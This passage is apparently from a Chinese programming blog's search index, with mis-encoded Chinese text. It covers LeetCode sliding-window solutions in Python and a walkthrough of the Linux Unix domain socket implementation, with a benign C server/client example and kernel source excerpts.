ä¸ªæ»¡è¶³é¢˜ç›®è¦æ±‚çš„å­æ•°ç»„ï¼š[1,0,1]ã€[1,0,1,0]ã€[0,1,0,1]ã€[1,0,1] æ€è·¯ï¼š\nå°†æ°å¥½æ‹†åˆ†æˆä¸¤ä¸ªè‡³å°‘ï¼Œç„¶åç›´æ¥å¥—ç”¨è¶Šé•¿è¶Šåˆçš„å…¬å¼ã€‚\nå®ç°ï¼š\nclass Solution: def numSubarraysWithSum(self, nums: List[int], goal: int) -\u0026gt; int: def sliding_window(nums: List[int], goal: int) -\u0026gt; int: ans = left = 0 sum = 0 for right, p in enumerate(nums): sum += p while left \u0026lt;= right and sum \u0026gt;= goal: sum -= nums[left] left += 1 ans += left return ans return sliding_window(nums, goal) - sliding_window(nums, goal + 1) 3306.å…ƒéŸ³è¾…éŸ³å­—ç¬¦ä¸²è®¡æ•° II 3306. å…ƒéŸ³è¾…éŸ³å­—ç¬¦ä¸²è®¡æ•° II\nç»™ä½ ä¸€ä¸ªå­—ç¬¦ä¸²wordå’Œä¸€ä¸ªéè´Ÿæ•´æ•°kã€‚\nè¿”å› word çš„ å­å­—ç¬¦ä¸²ä¸­ï¼Œæ¯ä¸ªå…ƒéŸ³å­—æ¯ï¼ˆ'a'ã€'e'ã€'i'ã€'o'ã€'u'è‡³å°‘å‡ºç°ä¸€æ¬¡ï¼Œå¹¶ä¸”æ°å¥½ åŒ…å«kä¸ªè¾…éŸ³å­—æ¯çš„å­å­—ç¬¦ä¸²çš„æ€»æ•°ã€‚\nç¤ºä¾‹ 1ï¼š\n**è¾“å…¥ï¼š**word = \u0026ldquo;aeioqq\u0026rdquo;, k = 1\n**è¾“å‡ºï¼š**0\nè§£é‡Šï¼š\nä¸å­˜åœ¨åŒ…å«æ‰€æœ‰å…ƒéŸ³å­—æ¯çš„å­å­—ç¬¦ä¸²ã€‚\næ€è·¯ï¼š\nä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä½†æ˜¯éš¾åº¦è¦é«˜ä¸€äº›ï¼Œå› ä¸ºæ»¡è¶³æ¡ä»¶å¹¶ä¸ç®€å•æ„é€ ï¼Œæˆ‘å¼€å§‹æ˜¯æ‰“ç®—ä½¿ç”¨å“ˆå¸Œè¡¨æ„å»ºä¸€ä¸ªå…ƒéŸ³å­—æ¯è¡¨ï¼Œå¦‚æœæ»‘åŠ¨çª—å£çš„å“ˆå¸Œè¡¨å¤§äºç­‰äºå…ƒéŸ³å­—æ¯è¡¨ï¼Œé‚£ä¹ˆå°±æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶ï¼Œç¬¬äºŒä¸ªæ¡ä»¶åªå¥½ç”¨ä¸€ä¸ªcountå˜é‡æ¥è®¡æ•°ï¼Œä½†æ˜¯è¿™æ ·çš„å®ç°è¶…è¿‡äº†æ—¶é—´é™åˆ¶.\næœ€ååšäº†ä¸€äº›ä¼˜åŒ–ã€‚\nclass Solution: def countOfSubstrings(self, word: str, k: int) -\u0026gt; int: def s(word: str, k: int) -\u0026gt; int: ans = left = 0 cnt_f = 0 cnt_y = 0 cnt_w = Counter() for right, p in enumerate(word): if p in \u0026#34;aeiou\u0026#34;: cnt_w[p] += 1 else: cnt_f += 1 while len(cnt_w)== 5 and cnt_f \u0026gt;= k: if word[left] in \u0026#34;aeiou\u0026#34;: cnt_w[word[left]] -= 1 if cnt_w[word[left]] == 0: del cnt_w[word[left]] else: cnt_f -= 1 left += 1 ans += left return ans return s(word, k) - s(word, k + 1) ä¼˜åŒ–äºŒ\næŠŠä¸¤ä¸ªæ»‘åŠ¨çª—å£åˆå¹¶æˆä¸€ä¸ªã€‚æˆ‘ä¸€èˆ¬æŠŠè¿™ç§æ»‘çª—å«åšä¸‰æŒ‡é’ˆæ»‘çª—ã€‚\nclass Solution: def countOfSubstrings(self, word: str, k: int) -\u0026gt; int: cnt_vowel1 = defaultdict(int) cnt_vowel2 = defaultdict(int) cnt_consonant1 = cnt_consonant2 = 0 ans = left1 = left2 = 0 for b in word: if b in \u0026#34;aeiou\u0026#34;: cnt_vowel1[b] += 1 cnt_vowel2[b] += 1 else: cnt_consonant1 += 1 cnt_consonant2 += 1 while len(cnt_vowel1) == 5 and cnt_consonant1 \u0026gt;= k: out = word[left1] if out in \u0026#34;aeiou\u0026#34;: cnt_vowel1[out] -= 1 if cnt_vowel1[out] == 0: del cnt_vowel1[out] else: cnt_consonant1 -= 1 left1 += 1 while len(cnt_vowel2) == 5 and cnt_consonant2 \u0026gt; k: out = word[left2] if out in \u0026#34;aeiou\u0026#34;: cnt_vowel2[out] -= 1 if cnt_vowel2[out] == 0: del cnt_vowel2[out] else: cnt_consonant2 -= 1 left2 += 1 ans += left1 - left2 return ans ","date":"2025-02-13T00:00:00Z","image":"https://chenyuan1125.github.io/p/leetcode%E5%88%B7%E9%A2%98%E4%B8%8D%E5%AE%9A%E9%95%BF%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%B8%93%E9%A2%98/1_hu331890604468743384.png","permalink":"https://chenyuan1125.github.io/p/leetcode%E5%88%B7%E9%A2%98%E4%B8%8D%E5%AE%9A%E9%95%BF%E6%BB%91%E5%8A%A8%E7%AA%97%E5%8F%A3%E4%B8%93%E9%A2%98/","title":"LeetCodeåˆ·é¢˜:ä¸å®šé•¿æ»‘åŠ¨çª—å£ä¸“é¢˜"},{"content":"Unix Domain Socketæºç å®ç°åˆ†æ(OLK 6.6) å¯¹äºæ­£å¸¸çš„udsé€šä¿¡çš„åˆ›å»ºä¸€èˆ¬åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šserverå’Œclientï¼Œæˆ‘ä»¬åˆ†åˆ«ä»serverå’Œclientæ„å»ºä»£ç çš„å…³é”®å‡½æ•°æ¥åˆ†æudsçš„æºç å®ç°\nserverå®ç°ä»£ç ï¼š\n// Server code (server.c) #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SOCKET_PATH \u0026#34;unix_socket\u0026#34; #define BUFFER_SIZE 100 int main() { int server_sock, client_sock; struct sockaddr_un server_addr; char buffer[BUFFER_SIZE]; // Create socket if ((server_sock = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\u0026#34;socket error\u0026#34;); exit(1); } // Set server address structure memset(\u0026amp;server_addr, 0, sizeof(server_addr)); server_addr.sun_family = AF_UNIX; strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1); // Bind the socket to the address unlink(SOCKET_PATH); if (bind(server_sock, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;bind error\u0026#34;); close(server_sock); exit(1); } // Listen for incoming connections if (listen(server_sock, 5) == -1) { perror(\u0026#34;listen error\u0026#34;); close(server_sock); exit(1); } printf(\u0026#34;Server is listening on %s\\n\u0026#34;, SOCKET_PATH); // Accept a client connection if ((client_sock = accept(server_sock, NULL, NULL)) == -1) { perror(\u0026#34;accept error\u0026#34;); close(server_sock); exit(1); } // Receive data from the client int bytes_received = read(client_sock, buffer, BUFFER_SIZE); if (bytes_received \u0026gt; 0) { buffer[bytes_received] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;Received from client: %s\\n\u0026#34;, buffer); } // Send a response to the client const char* response = \u0026#34;Message received\u0026#34;; write(client_sock, response, strlen(response)); // Clean up close(client_sock); close(server_sock); unlink(SOCKET_PATH); return 0; } clientå®ç°ä»£ç ï¼š\n// Client code (client.c) #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/un.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define SOCKET_PATH \u0026#34;unix_socket\u0026#34; int main() { int client_sock; struct sockaddr_un server_addr; // Create socket if ((client_sock = socket(AF_UNIX, SOCK_STREAM, 0)) == -1) { perror(\u0026#34;socket error\u0026#34;); exit(1); } // Set server address structure memset(\u0026amp;server_addr, 0, sizeof(server_addr)); server_addr.sun_family = AF_UNIX; strncpy(server_addr.sun_path, SOCKET_PATH, sizeof(server_addr.sun_path) - 1); // Connect to the server if (connect(client_sock, (struct sockaddr*)\u0026amp;server_addr, sizeof(server_addr)) == -1) { perror(\u0026#34;connect error\u0026#34;); close(client_sock); exit(1); } // Send data to the server const char* message = \u0026#34;Hello, server!\u0026#34;; write(client_sock, message, strlen(message)); // Receive response from the server char buffer[100]; int bytes_received = read(client_sock, buffer, sizeof(buffer) - 1); if (bytes_received \u0026gt; 0) { buffer[bytes_received] = \u0026#39;\\0\u0026#39;; printf(\u0026#34;Received from server: %s\\n\u0026#34;, buffer); } // Clean up close(client_sock); return 0; } é€šä¿¡æµç¨‹å¦‚ä¸‹ï¼š\næºç åˆ†æç»“æ„å›¾å¦‚ä¸‹ï¼š\nunixåŸŸå¥—æ¥å­—åœ°å€ç»“æ„\n//include/uapi/linux/un.h #define UNIX_PATH_MAX 108 struct sockaddr_un { __kernel_sa_family_t sun_family; /* AF_UNIX */ char sun_path[UNIX_PATH_MAX]; /* pathname */ }; socket() ä¸€å¥è¯æ¦‚æ‹¬socketå‡½æ•°ï¼šåˆ›å»ºå¹¶åˆå§‹åŒ–å¥—æ¥å­—ï¼Œåˆ›å»ºæ–‡ä»¶æè¿°ç¬¦å¹¶å…³è”ã€‚\n//syscallç³»ç»Ÿè°ƒç”¨ SYSCALL_DEFINE3(socket, int, family, int, type, int, protocol) { return __sys_socket(family, type, protocol); } socket()-\u0026gt;__sys_socket()\n//__sys_socketé€šè¿‡è°ƒç”¨__sys_socket_createå‡½æ•°è¿”å›sockå¯¹è±¡ï¼Œæœ€åé€šè¿‡sock_map_fdå‡½æ•°å°†å¯¹è±¡è½¬åŒ–ä¸ºæ–‡ä»¶æè¿°ç¬¦ã€‚ int __sys_socket(int family, int type, int protocol) { struct socket *sock; int flags; sock = __sys_socket_create(family, type, update_socket_protocol(family, type, protocol)); if (IS_ERR(sock)) return PTR_ERR(sock); flags = type \u0026amp; ~SOCK_TYPE_MASK; if (SOCK_NONBLOCK != O_NONBLOCK \u0026amp;\u0026amp; (flags \u0026amp; SOCK_NONBLOCK)) flags = (flags \u0026amp; ~SOCK_NONBLOCK) | O_NONBLOCK; return sock_map_fd(sock, flags \u0026amp; (O_CLOEXEC | O_NONBLOCK)); } å¥—æ¥å­—çš„åˆ›å»ºç”±__sys_socket_createå®Œæˆï¼Œsock_map_fdåˆ†é…ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ï¼Œç„¶åä¸ºå¥—æ¥å­—åˆ†é…æ–‡ä»¶å¯¹è±¡ï¼Œæœ€åå°†ä¸¤è€…å…³è”èµ·æ¥ã€‚\nsock_map_fd()å°†sockç»“æ„æ˜ å°„ä¸ºæ–‡ä»¶æè¿°ç¬¦\nstatic int sock_map_fd(struct socket *sock, int flags) { struct file *newfile; //è·å–å¯ç”¨æ–‡ä»¶æè¿°ç¬¦ int fd = get_unused_fd_flags(flags); if (unlikely(fd \u0026lt; 0)) { sock_release(sock); return fd; } //è°ƒç”¨ sock_alloc_file() ä¸ºå¥—æ¥å­—åˆ†é…ä¸€ä¸ªæ–‡ä»¶å¯¹è±¡ (struct file)ã€‚ newfile = sock_alloc_file(sock, flags, NULL); //å¦‚æœåˆ†é…æˆåŠŸï¼Œè°ƒç”¨ fd_install(fd, newfile) å°†æ–‡ä»¶å¯¹è±¡ä¸æ–‡ä»¶æè¿°ç¬¦ (fd) å…³è”èµ·æ¥ï¼Œå¹¶è¿”å›è¯¥æ–‡ä»¶æè¿°ç¬¦ã€‚ if (!IS_ERR(newfile)) { fd_install(fd, newfile); return fd; } put_unused_fd(fd); return PTR_ERR(newfile); } sock_map_fd()-\u0026gt;sock_alloc_file()\nstruct file *sock_alloc_file(struct socket *sock, int flags, const char *dname) { struct file *file; if (!dname) dname = sock-\u0026gt;sk ? sock-\u0026gt;sk-\u0026gt;sk_prot_creator-\u0026gt;name : \u0026#34;\u0026#34;; //åˆ†é…ä¼ªæ–‡ä»¶ (alloc_file_pseudo)ï¼š file = alloc_file_pseudo(SOCK_INODE(sock), sock_mnt, dname, O_RDWR | (flags \u0026amp; O_NONBLOCK), \u0026amp;socket_file_ops); if (IS_ERR(file)) { sock_release(sock); return file; } //æ–‡ä»¶å¯¹è±¡åˆå§‹åŒ– file-\u0026gt;f_mode |= FMODE_NOWAIT; sock-\u0026gt;file = file; file-\u0026gt;private_data = sock; stream_open(SOCK_INODE(sock), file); return file; } EXPORT_SYMBOL(sock_alloc_file); __sys_socket()-\u0026gt;__sys_socket_create()\n//__sys_socket_createè°ƒç”¨sock_createåˆ›å»ºsocket static struct socket *__sys_socket_create(int family, int type, int protocol) { struct socket *sock; int retval; /* Check the SOCK_* constants for consistency. */ BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC); BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_CLOEXEC \u0026amp; SOCK_TYPE_MASK); BUILD_BUG_ON(SOCK_NONBLOCK \u0026amp; SOCK_TYPE_MASK); if ((type \u0026amp; ~SOCK_TYPE_MASK) \u0026amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK)) return ERR_PTR(-EINVAL); type \u0026amp;= SOCK_TYPE_MASK; retval = sock_create(family, type, protocol, \u0026amp;sock); if (retval \u0026lt; 0) return ERR_PTR(retval); return sock; } __sys_socket_create()-\u0026gt;sock_create()\n//sock_createè°ƒç”¨__sock_create /** *\tsock_create - creates a socket *\t@family: protocol family (AF_INET, ...) *\t@type: communication type (SOCK_STREAM, ...) *\t@protocol: protocol (0, ...) *\t@res: new socket * *\tA wrapper around __sock_create(). *\tReturns 0 or an error. This function internally uses GFP_KERNEL. */ int sock_create(int family, int type, int protocol, struct socket **res) { return __sock_create(current-\u0026gt;nsproxy-\u0026gt;net_ns, family, type, protocol, res, 0); } //EXPORT_SYMBOL() æ˜¯ä¸€ä¸ªå†…æ ¸å®ï¼Œç”¨äºå°†ç¬¦å·ï¼ˆå‡½æ•°æˆ–å˜é‡ï¼‰å¯¼å‡ºåˆ°å†…æ ¸çš„ç¬¦å·è¡¨ä¸­ï¼Œä»¥ä¾¿è¯¥å‡½æ•°å¯ä»¥è¢«å…¶ä»–å†…æ ¸æ¨¡å—ä½¿ç”¨ã€‚ EXPORT_SYMBOL(sock_create); __sock_create-\u0026gt;unix_create()\n/** *\t__sock_create - creates a socket *\t@net: net namespace *\t@family: protocol family (AF_INET, ...) *\t@type: communication type (SOCK_STREAM, ...) *\t@protocol: protocol (0, ...) *\t@res: new socket *\t@kern: boolean for kernel space sockets * *\tCreates a new socket and assigns it to @res, passing through LSM. *\tReturns 0 or an error. On failure @res is set to %NULL. @kern must *\tbe set to true if the socket resides in kernel space. *\tThis function internally uses GFP_KERNEL. */ int __sock_create(struct net *net, int family, int type, int protocol, struct socket **res, int kern) { int err; struct socket *sock; const struct net_proto_family *pf; ... //Check if creating a new socket is allowed err = security_socket_create(family, type, protocol, kern); /* *\tAllocate the socket and allow the family to set things up. if *\tthe protocol is 0, the family is instructed to select an appropriate *\tdefault. */ sock = sock_alloc(); if (!sock) { net_warn_ratelimited(\u0026#34;socket: no more sockets\\n\u0026#34;); return -ENFILE;\t/* Not exactly a match, but its the closest posix thing */ } ... pf = rcu_dereference(net_families[family]); /* * We will call the -\u0026gt;create function, that possibly is in a loadable * module, so we have to bump that loadable module refcnt first. */ err = pf-\u0026gt;create(net, sock, protocol, kern); ... EXPORT_SYMBOL(__sock_create); sock_create() å‡½æ•°é¦–å…ˆè°ƒç”¨security_socket_create æ£€æŸ¥æ˜¯å¦æœ‰æƒé™åˆ›å»ºæ–°çš„socketæ–‡ä»¶ï¼Œæ¥ç€è°ƒç”¨sock_alloc() ç”³è¯·ä¸€ä¸ª struct socket ç»“æ„ï¼Œç„¶åè°ƒç”¨æŒ‡å®šåè®®æ—çš„ create() å‡½æ•°ï¼ˆnet_families[family]-\u0026gt;create()ï¼‰è¿›è¡Œè¿›ä¸€æ­¥çš„åˆ›å»ºåŠŸèƒ½ã€‚net_families å˜é‡çš„ç±»å‹ä¸º struct net_proto_familyï¼Œå…¶å®šä¹‰å¦‚ä¸‹ï¼š\nstruct net_proto_family { int family; int (*create)(struct socket *sock, int protocol); ... }; family å­—æ®µå¯¹åº”çš„å°±æ˜¯å…·ä½“çš„åè®®æ—ï¼Œè€Œ create å­—æ®µæŒ‡å®šäº†å…¶åˆ›å»ºsocketçš„æ–¹æ³•ã€‚ä¸€ä¸ªå…·ä½“åè®®æ—éœ€è¦é€šè¿‡è°ƒç”¨ sock_register() å‡½æ•°å‘ç³»ç»Ÿæ³¨å†Œå…¶åˆ›å»ºsocketçš„æ–¹æ³•ã€‚ä¾‹å¦‚ Unix socket å°±åœ¨åˆå§‹åŒ–æ—¶é€šè¿‡ä¸‹é¢çš„ä»£ç æ³¨å†Œï¼š\nstatic const struct net_proto_family unix_family_ops = { .family = PF_UNIX, .create = unix_create, .owner\t= THIS_MODULE, }; static int __init af_unix_init(void) { ... sock_register(\u0026amp;unix_family_ops); ... return 0; } æ‰€ä»¥ä»ä¸Šé¢çš„ä»£ç å¯ä»¥æŒ‡å®šï¼Œå¯¹äº Unix socket çš„è¯ï¼Œnet_families[family]-\u0026gt;create() è¿™è¡Œä»£ç å®é™…è°ƒç”¨çš„æ˜¯ unix_create() å‡½æ•°ã€‚\n//unix_createåˆå§‹åŒ–å¥—æ¥å­—å¹¶æ ¹æ®ç±»å‹è°ƒç”¨åˆé€‚çš„å¤„ç†å‡½æ•°ï¼ŒåŒæ—¶è°ƒç”¨unix_create1å‡½æ•°åˆ›å»ºsocketã€‚ static int unix_create(struct net *net, struct socket *sock, int protocol, int kern) { struct sock *sk; //å°†å¥—æ¥å­—çŠ¶æ€è®¾ç½®ä¸ºæœªè¿æ¥ã€‚ sock-\u0026gt;state = SS_UNCONNECTED; //æ ¹æ®å¥—æ¥å­—ç±»å‹è®¾ç½®æ“ä½œï¼š switch (sock-\u0026gt;type) { case SOCK_STREAM: sock-\u0026gt;ops = \u0026amp;unix_stream_ops; break; /* *\tBelieve it or not BSD has AF_UNIX, SOCK_RAW though *\tnothing uses it. */ case SOCK_RAW: sock-\u0026gt;type = SOCK_DGRAM; fallthrough; case SOCK_DGRAM: sock-\u0026gt;ops = \u0026amp;unix_dgram_ops; break; case SOCK_SEQPACKET: sock-\u0026gt;ops = \u0026amp;unix_seqpacket_ops; break; default: return -ESOCKTNOSUPPORT; } sk = unix_create1(net, sock, kern, sock-\u0026gt;type); if (IS_ERR(sk)) return PTR_ERR(sk); return 0; } unix_create()-\u0026gt;unix_create1()\n//åˆ†é…èµ„æºå’Œåˆå§‹åŒ–å„ç§å†…éƒ¨æ•°æ®ç»“æ„ã€‚ static struct sock *unix_create1(struct net *net, struct socket *sock, int kern, int type) { struct unix_sock *u; struct sock *sk; int err; ... //æ ¹æ®å¥—æ¥å­—ç±»å‹ (SOCK_STREAM, SOCK_DGRAM æˆ– SOCK_SEQPACKET)ï¼Œè°ƒç”¨ sk_alloc() åˆ†é…ä¸€ä¸ªæ–°çš„ sock å¯¹è±¡ã€‚ if (type == SOCK_STREAM) sk = sk_alloc(net, PF_UNIX, GFP_KERNEL, \u0026amp;unix_stream_proto, kern); else /*dgram and seqpacket */ sk = sk_alloc(net, PF_UNIX, GFP_KERNEL, \u0026amp;unix_dgram_proto, kern); ... //å°†å¥—æ¥å­— sock ä¸sockå¯¹è±¡ sk ç›¸å…³è”ï¼Œåˆå§‹åŒ–æ•°æ®ç»“æ„ã€‚ sock_init_data(sock, sk); //åˆå§‹åŒ– sk ç»“æ„çš„æˆå‘˜ sk-\u0026gt;sk_hash\t= unix_unbound_hash(sk); sk-\u0026gt;sk_allocation\t= GFP_KERNEL_ACCOUNT; sk-\u0026gt;sk_write_space\t= unix_write_space; sk-\u0026gt;sk_max_ack_backlog\t= net-\u0026gt;unx.sysctl_max_dgram_qlen; sk-\u0026gt;sk_destruct\t= unix_sock_destructor; u\t= unix_sk(sk); u-\u0026gt;path.dentry = NULL; u-\u0026gt;path.mnt = NULL; ... return sk; struct socket æ˜¯ Linux ç½‘ç»œæ ˆä¸­è¡¨ç¤ºä¸€ä¸ªå¥—æ¥å­—çš„æ ¸å¿ƒç»“æ„ï¼Œé€šå¸¸ç”¨äºä¸ç”¨æˆ·ç©ºé—´åº”ç”¨ç¨‹åºè¿›è¡Œäº¤äº’ã€‚sock æ˜¯ç”¨æˆ·ç©ºé—´ç¨‹åºä¸å†…æ ¸ä¸­çš„ç½‘ç»œæ ˆé€šä¿¡çš„æ¥å£ï¼Œä»£è¡¨äº†ä¸€ä¸ªç½‘ç»œç«¯ç‚¹ï¼Œç”¨äºå»ºç«‹è¿æ¥ã€å‘é€/æ¥æ”¶æ•°æ®ç­‰æ“ä½œ\nunix_sock æ˜¯ä¸€ä¸ªåœ¨ Linux å†…æ ¸ä¸­ä¸ Unix åŸŸå¥—æ¥å­—ç›¸å…³çš„ç§æœ‰æ•°æ®ç»“æ„ã€‚å®ƒæ‰©å±•äº† struct sockï¼Œç”¨äºå­˜å‚¨ä¸ Unix åŸŸå¥—æ¥å­—ç›¸å…³çš„ç‰¹å®šæ•°æ®ã€‚\nbind() ä¸€å¥è¯æ¦‚æ‹¬bindå‡½æ•°ï¼šå°†udsåœ°å€ç»‘å®šåˆ°å¥—æ¥å­—\n//syscallç³»ç»Ÿè°ƒç”¨ SYSCALL_DEFINE3(bind, int, fd, struct sockaddr __user *, umyaddr, int, addrlen) { return __sys_bind(fd, umyaddr, addrlen); } bind()-\u0026gt;__sys_bind()\nint __sys_bind(int fd, struct sockaddr __user *umyaddr, int addrlen) { struct socket *sock; struct sockaddr_storage address; int err, fput_needed; //æŸ¥æ‰¾å¥—æ¥å­— sock = sockfd_lookup_light(fd, \u0026amp;err, \u0026amp;fput_needed); if (sock) { //å°†ç”¨æˆ·ç©ºé—´åœ°å€ç§»åŠ¨åˆ°å†…æ ¸ç©ºé—´ err = move_addr_to_kernel(umyaddr, addrlen, \u0026amp;address); if (!err) { //å®‰å…¨æ£€æŸ¥(æƒé™) err = security_socket_bind(sock, (struct sockaddr *)\u0026amp;address, addrlen); if (!err) //æ‰§è¡Œå…·ä½“åè®®å®ç°çš„bindå‡½æ•° err = READ_ONCE(sock-\u0026gt;ops)-\u0026gt;bind(sock, (struct sockaddr *) \u0026amp;address, addrlen); } fput_light(sock-\u0026gt;file, fput_needed); } return err; } __sys_bind()-\u0026gt;unix_bind()\nstatic int unix_bind(struct socket *sock, struct sockaddr *uaddr, int addr_len) { struct sockaddr_un *sunaddr = (struct sockaddr_un *)uaddr; // å°†é€šç”¨åœ°å€ç»“æ„è½¬æ¢ä¸ºUNIXä¸“ç”¨çš„åœ°å€ç»“æ„ struct sock *sk = sock-\u0026gt;sk; // è·å–å¥—æ¥å­—çš„åŸºç¡€ç»“æ„ int err; // ç”¨äºå­˜å‚¨é”™è¯¯ç  // å½“ sun_path ä¸ºç©ºæ—¶ï¼Œunix_autobind() ä¼šä¸ºå¥—æ¥å­—è‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªå”¯ä¸€çš„ã€ä¸´æ—¶çš„åœ°å€ï¼Œé€šå¸¸åœ¨å†…æ ¸ä¸­åˆ›å»ºä¸€ä¸ªä¸´æ—¶æ–‡ä»¶æ¥è¡¨ç¤ºè¯¥å¥—æ¥å­—çš„åœ°å€ã€‚ if (addr_len == offsetof(struct sockaddr_un, sun_path) \u0026amp;\u0026amp; sunaddr-\u0026gt;sun_family == AF_UNIX) return unix_autobind(sk); // éªŒè¯åœ°å€æ˜¯å¦åˆæ³• err = unix_validate_addr(sunaddr, addr_len); if (err) return err; // æ ¹æ®sun_pathçš„ç¬¬ä¸€ä¸ªå­—ç¬¦å†³å®šè°ƒç”¨å“ªä¸ªç»‘å®šå‡½æ•° if (sunaddr-\u0026gt;sun_path[0]) err = unix_bind_bsd(sk, sunaddr, addr_len); // è°ƒç”¨BSDé£æ ¼åœ°å€ç»‘å®šå‡½æ•° else err = unix_bind_abstract(sk, sunaddr, addr_len); // è°ƒç”¨æŠ½è±¡åœ°å€ç»‘å®šå‡½æ•° return err; } è¿™é‡Œæ¶‰åŠåˆ°äº†ä¸‰ç§ä¸åŒçš„bindå‡½æ•°è°ƒç”¨ï¼Œè‡ªåŠ¨ç»‘å®š(unix_autobind)ã€BSD é£æ ¼ (unix_bind_bsd()) å’ŒæŠ½è±¡é£æ ¼ (unix_bind_abstract())\nBSD é£æ ¼ç»‘å®š (unix_bind_bsd()) è·¯å¾„åœ°å€ç»‘å®šï¼šBSD é£æ ¼çš„ UNIX domain socket ä½¿ç”¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„è·¯å¾„ä½œä¸ºåœ°å€ã€‚ä¾‹å¦‚ï¼š/tmp/mysocketï¼Œå³ sun_path çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯ /ï¼Œè¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªæ ‡å‡†çš„è·¯å¾„ã€‚ æ–‡ä»¶ç³»ç»Ÿä¾èµ–ï¼šBSD é£æ ¼çš„åœ°å€å®é™…ä¸Šæ˜¯æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªè·¯å¾„ï¼Œå› æ­¤å®ƒéœ€è¦åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºä¸€ä¸ªå¯¹åº”çš„æ–‡ä»¶èŠ‚ç‚¹ï¼Œè¿™æ ·å…¶ä»–è¿›ç¨‹å°±å¯ä»¥é€šè¿‡è®¿é—®è¿™ä¸ªæ–‡ä»¶èŠ‚ç‚¹æ¥ä¸è¯¥å¥—æ¥å­—é€šä¿¡ã€‚ æŒä¹…æ€§ï¼šç”±äºæ˜¯åŸºäºæ–‡ä»¶ç³»ç»Ÿçš„è·¯å¾„ï¼ŒBSD é£æ ¼çš„ UNIX socket åœ°å€åœ¨ç¨‹åºé€€å‡ºåæ–‡ä»¶ä»ç„¶å­˜åœ¨ï¼Œå› æ­¤éœ€è¦æ˜¾å¼åœ°åˆ é™¤è·¯å¾„ï¼ˆå³ä½¿ç”¨ unlink()ï¼‰ï¼Œå¦åˆ™ä¸‹æ¬¡ç»‘å®šåŒæ ·çš„è·¯å¾„å¯èƒ½ä¼šå¤±è´¥ã€‚ æŠ½è±¡é£æ ¼ç»‘å®š (unix_bind_abstract()) ä¸ä¾èµ–äºæ–‡ä»¶ç³»ç»Ÿï¼šæŠ½è±¡é£æ ¼çš„ UNIX domain socket åœ°å€ä¸æ˜¯åŸºäºæ–‡ä»¶ç³»ç»Ÿçš„è·¯å¾„ï¼Œè€Œæ˜¯ç”±ä¸€ä¸ªä»¥ NULï¼ˆç©ºå­—ç¬¦ï¼Œ'\\0'ï¼‰å¼€å¤´çš„å­—ç¬¦ä¸²ä½œä¸ºåœ°å€ã€‚å› ä¸ºè¿™ä¸ªåœ°å€ä¸æ˜¯æ–‡ä»¶è·¯å¾„ï¼Œæ‰€ä»¥å®ƒä¸ä¾èµ–æ–‡ä»¶ç³»ç»Ÿï¼Œé€‚åˆåœ¨æŸäº›æƒ…å†µä¸‹é¿å…æ–‡ä»¶ç³»ç»Ÿçš„å¤æ‚æ€§æˆ–å¼€é”€ã€‚ ä»…åœ¨å†…æ ¸ä¸­å­˜åœ¨ï¼šæŠ½è±¡åœ°å€çš„ä½œç”¨åŸŸä»…é™äºå†…æ ¸å†…éƒ¨ï¼Œå®ƒä¸éœ€è¦åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­åˆ›å»ºèŠ‚ç‚¹ï¼Œå› æ­¤å®Œå…¨ç”±å†…æ ¸ç®¡ç†ã€‚è¿™æ ·å¯ä»¥å‡å°‘å¯¹ç£ç›˜çš„ä¾èµ–ï¼ŒåŒæ—¶åœ¨æŸäº›ç³»ç»Ÿï¼ˆå¦‚æ²¡æœ‰æŒä¹…å­˜å‚¨çš„åµŒå…¥å¼ç³»ç»Ÿï¼‰ä¸­ä¹Ÿå¾ˆæœ‰ç”¨ã€‚ ä¸´æ—¶æ€§ï¼šæŠ½è±¡åœ°å€çš„ç”Ÿå‘½å‘¨æœŸä¸ç»‘å®šè¯¥åœ°å€çš„è¿›ç¨‹çš„ç”Ÿå‘½å‘¨æœŸç›¸åŒï¼Œå½“è¿›ç¨‹ç»“æŸæ—¶ï¼ŒæŠ½è±¡åœ°å€ä¹Ÿéšä¹‹é‡Šæ”¾ã€‚å®ƒä¸éœ€è¦åƒ BSD é£æ ¼é‚£æ ·æ‰‹åŠ¨åˆ é™¤è·¯å¾„ã€‚ BSD é£æ ¼æä¾›äº†ä¸€ç§åŸºäºæ–‡ä»¶ç³»ç»Ÿçš„åœ°å€ç»‘å®šæ–¹å¼ï¼Œå…·æœ‰æŒä¹…æ€§å’Œæ–‡ä»¶æƒé™ç®¡ç†çš„ä¼˜ç‚¹ï¼Œé€‚åˆéœ€è¦é•¿æœŸé€šä¿¡å’Œæ–‡ä»¶æƒé™æ§åˆ¶çš„åº”ç”¨åœºæ™¯ã€‚\næŠ½è±¡é£æ ¼åˆ™æä¾›äº†ä¸€ç§å†…æ ¸ç®¡ç†çš„è½»é‡åŒ–åœ°å€ç»‘å®šæ–¹å¼ï¼Œé¿å…äº†æ–‡ä»¶ç³»ç»Ÿçš„ä¾èµ–ï¼Œæ›´é€‚åˆä¸´æ—¶æ€§é€šä¿¡ï¼Œå‡å°‘äº†èµ„æºå 